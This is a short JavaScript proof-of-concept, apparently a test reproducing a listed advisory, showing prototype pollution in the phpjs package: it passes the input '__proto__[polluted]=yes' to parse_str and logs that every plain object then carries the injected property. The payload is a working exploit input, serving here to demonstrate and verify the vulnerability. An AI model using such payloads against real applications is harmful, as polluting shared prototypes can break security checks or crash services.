// //https://snyk.io/vuln/SNYK-JS-PHPJS-598681

// test("prototype pollution in phpjs", () => {
console.log({}.polluted);

  const p = require("phpjs");
  p.parse_str("__proto__[polluted]=yes", {});

console.log({}.polluted);
// });
